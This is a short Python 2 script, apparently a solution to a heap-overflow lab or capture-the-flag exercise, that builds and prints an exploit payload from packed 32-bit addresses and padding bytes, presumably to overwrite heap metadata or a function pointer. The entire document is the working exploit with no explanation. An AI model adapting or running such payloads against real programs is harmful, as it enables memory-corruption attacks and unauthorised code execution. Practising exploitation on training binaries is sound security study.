import struct

heap_payload = struct.pack('<L', 0x80484eb) + 'A' * 12 + struct.pack('<L', 0xffffcd4c) + struct.pack('<L', 0x804b418)

print heap_payload
